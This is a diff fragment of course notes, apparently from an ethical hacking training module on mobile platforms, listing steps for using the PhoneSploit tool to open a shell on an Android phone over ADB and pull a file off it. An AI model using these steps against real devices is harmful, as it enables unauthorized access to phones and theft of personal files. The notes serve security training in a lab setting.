@@ -273,16 +273,26 @@ Module 17 - Hacking Mobile Platforms
 17.4 Exploit Android platform through ADB using Phonesploit
 
 Cd Phonesploit
+
 // Python3 -m pip install colorama
+
 Python3 phonesploit.py
+
 3
+
 Entry phone IP address
+
 At main_menu prompt, type 4 (Access shell on a phone)
+
 Pwd
+
 Ls
+
 Cd sdcard
 
+
 Cd Download
+
 Ls
 
 Download/ Pull file: adb pull sdcaard/log.txt /home/username/Desktop
